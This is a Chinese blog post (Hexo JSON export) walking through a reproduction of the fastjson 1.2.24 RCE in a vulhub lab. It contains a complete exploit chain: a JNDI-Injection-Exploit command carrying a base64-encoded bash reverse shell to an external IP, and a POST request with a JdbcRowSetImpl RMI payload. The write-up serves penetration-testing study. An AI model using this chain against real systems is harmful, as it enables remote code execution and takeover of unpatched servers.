{"title":"fastjson漏洞复现","uid":"27efebc17e75edd169130d3950d28289","slug":"fastjson漏洞复现","date":"2021-10-12T11:58:36.554Z","updated":"2021-10-12T11:59:05.011Z","comments":true,"path":"api/articles/fastjson漏洞复现.json","keywords":null,"cover":[],"content":"<h1 id=\"fastjson漏洞复现\"><a href=\"#fastjson漏洞复现\" class=\"headerlink\" title=\"fastjson漏洞复现\"></a>fastjson漏洞复现</h1><h1 id=\"一、环境搭建\"><a href=\"#一、环境搭建\" class=\"headerlink\" title=\"一、环境搭建\"></a>一、环境搭建</h1><pre class=\"line-numbers language-Bash\" data-language=\"Bash\"><code class=\"language-Bash\">cd vulhub&#x2F;fastjson&#x2F;1.2.24‐rce docker‐compose up ‐d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>访问<a href=\"http://IP:8090%E5%8D%B3%E5%8F%AF\">http://IP:8090即可</a></p>\n<p><img src=\"https://tcs.teambition.net/storage/312a3a5e18586ff9bf0d3b26ae873cf64004?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDA0MzQyMiwiaWF0IjoxNjM0MDM5ODIyLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEzYTVlMTg1ODZmZjliZjBkM2IyNmFlODczY2Y2NDAwNCJ9.xepRhXdQW-XF2GuWaKycpjpM8QyC71IHYGHIij56LXg&download=image.png\"></p>\n<h1 id=\"二、漏洞复现\"><a href=\"#二、漏洞复现\" class=\"headerlink\" title=\"二、漏洞复现\"></a>二、漏洞复现</h1><h2 id=\"2-1漏洞判断\"><a href=\"#2-1漏洞判断\" class=\"headerlink\" title=\"2.1漏洞判断\"></a>2.1漏洞判断</h2><p>    正常来说fastjson是没有指纹的，但是我们可以通过报错来判断，比如直接发送post数据或者加一个左花括号不闭合都可以</p>\n<p><img src=\"https://tcs.teambition.net/storage/312aa2a600963267023554280c9b2d3cbdfb?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDA0MzQzMywiaWF0IjoxNjM0MDM5ODMzLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFhMmE2MDA5NjMyNjcwMjM1NTQyODBjOWIyZDNjYmRmYiJ9.Lm01xlINgs7H0uI3kKJdSWPninqRPan-o5AW8buyzY4&download=image_1.png\"></p>\n<h2 id=\"2-2使用EXP开启服务\"><a href=\"#2-2使用EXP开启服务\" class=\"headerlink\" title=\"2.2使用EXP开启服务\"></a>2.2使用EXP开启服务</h2><pre class=\"line-numbers language-Bash\" data-language=\"Bash\"><code class=\"language-Bash\">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDQuNDQuOTUuMjM3Lzc3NzcgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;204.44.95.237&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>其中:</p>\n<ul>\n<li><strong>-C</strong>  - 远程class文件中要执行的命令。</li>\n</ul>\n<p>    （可选项 , 默认命令是mac下打开计算器，即”open /Applications/Calculator.app”）</p>\n<ul>\n<li><strong>-A</strong>  - 服务器地址，可以是IP地址或者域名。</li>\n</ul>\n<p>    （可选项 , 默认地址是第一个网卡地址）</p>\n<p>将payload使用<a href=\"http://www.jackson-t.ca/runtime-exec-payloads.html\">http://www.jackson-t.ca/runtime-exec-payloads.html</a>编码（也可使用dnslog盲打）</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a6924055d06cd1792f984c04e9f2e2147?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDA0MzQ0MSwiaWF0IjoxNjM0MDM5ODQxLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE2OTI0MDU1ZDA2Y2QxNzkyZjk4NGMwNGU5ZjJlMjE0NyJ9.T6hW5tpH3EkjRXPKbfbD6fOZoQk8cWqhRCm7Onh_eNc&download=image_2.png\"></p>\n<p>服务开启后自动打开监听</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a74388f8dafa1a15864656741e25813fa?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDA0MzQ1MiwiaWF0IjoxNjM0MDM5ODUyLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE3NDM4OGY4ZGFmYTFhMTU4NjQ2NTY3NDFlMjU4MTNmYSJ9.J6tlu_dJ31r-BpVZla8p6ZCyIC2WXQcUOXXH-hWz0H4&download=image_3.png\"></p>\n<h2 id=\"2-3访问rmi服务\"><a href=\"#2-3访问rmi服务\" class=\"headerlink\" title=\"2.3访问rmi服务\"></a>2.3访问rmi服务</h2><p>修改访问方式为POST</p>\n<p>修改格式为Content-Type: application/json</p>\n<p>将服务的payload替换到请求包中</p>\n<pre class=\"line-numbers language-Bash\" data-language=\"Bash\"><code class=\"language-Bash\">POST &#x2F; HTTP&#x2F;1.1\nHost: 192.168.10.29:8090\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.131 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nConnection: close\nContent-Type: application&#x2F;json\nContent-Length: 160\n\n&#123;\n    &quot;b&quot;:&#123;\n        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,\n        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;204.44.95.237:1099&#x2F;xc8ffz&quot;,\n        &quot;autoCommit&quot;:true\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>开启监听</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a47949826d31733c5c66e2b336c66f183?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDA0MzQ2MCwiaWF0IjoxNjM0MDM5ODYwLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0Nzk0OTgyNmQzMTczM2M1YzY2ZTJiMzM2YzY2ZjE4MyJ9.mh2TUQfrgIxlqw9i219xTT1Uj-ZvAyh_EKbPBYa4RQo&download=image_4.png\"></p>\n<p>发送请求包</p>\n<h2 id=\"2-4拿到shell\"><a href=\"#2-4拿到shell\" class=\"headerlink\" title=\"2.4拿到shell\"></a>2.4拿到shell</h2><p><img src=\"https://tcs.teambition.net/storage/312a06ebcabaaec50f33f60000e2f9039af4?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzNDA0MzQ2NSwiaWF0IjoxNjM0MDM5ODY1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwNmViY2FiYWFlYzUwZjMzZjYwMDAwZTJmOTAzOWFmNCJ9.5W2GTI_TWouf1Rw5noV5gxhAsQf_rUILD6ws4bRy47g&download=image_5.png\"></p>\n<p>使用工具</p>\n<p>    <a href=\"https://github.com/welk1n/JNDI-Injection-Exploit/\">https://github.com/welk1n/JNDI-Injection-Exploit/</a></p>\n<p>    burp插件：<a href=\"https://github.com/Maskhe/FastjsonScan\">https://github.com/Maskhe/FastjsonScan</a></p>\n<p>参考文章</p>\n<p>    <a href=\"https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md\">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md</a></p>\n<p>    </p>\n","text":"fastjson漏洞复现一、环境搭建cd vulhub&#x2F;fastjson&#x2F;1.2.24‐rce docker‐compose up ‐d 访问http://IP:8090即可 二、漏洞复现2.1漏洞判断 正常来说fastjson是没有指纹的，但是我们可以通过报...","link":"","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">fastjson漏洞复现</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">一、环境搭建</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">二、漏洞复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-1%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD\"><span class=\"toc-text\">2.1漏洞判断</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-2%E4%BD%BF%E7%94%A8EXP%E5%BC%80%E5%90%AF%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">2.2使用EXP开启服务</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-3%E8%AE%BF%E9%97%AErmi%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">2.3访问rmi服务</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-4%E6%8B%BF%E5%88%B0shell\"><span class=\"toc-text\">2.4拿到shell</span></a></li></ol></li></ol>","author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"spring boot介绍","uid":"4df23ce2d032e16090d56b72df860ee6","slug":"spring boot介绍","date":"2021-10-13T12:56:08.395Z","updated":"2021-10-13T12:57:01.305Z","comments":true,"path":"api/articles/spring boot介绍.json","keywords":null,"cover":null,"text":"一、路由知识 有些程序员会自定义 /manage、/management 、项目 App 相关名称为 spring 根路径 Spring Boot Actuator 1.x 版本默认内置路由的起始路径为 / ，2.x 版本则统一以 /actuator 为起始路径 Spring B...","link":"","photos":[],"count_time":{"symbolsCount":"1k","symbolsTime":"1 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Nginx漏洞","uid":"bd8f109f788216dc7b6a90406caac8fe","slug":"Nginx漏洞","date":"2021-10-09T12:23:40.945Z","updated":"2021-10-09T12:23:26.753Z","comments":true,"path":"api/articles/Nginx漏洞.json","keywords":null,"cover":[],"text":"Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。 一、文件解析漏洞1.1、漏洞描述 该漏洞是由于Nginx...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":11,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}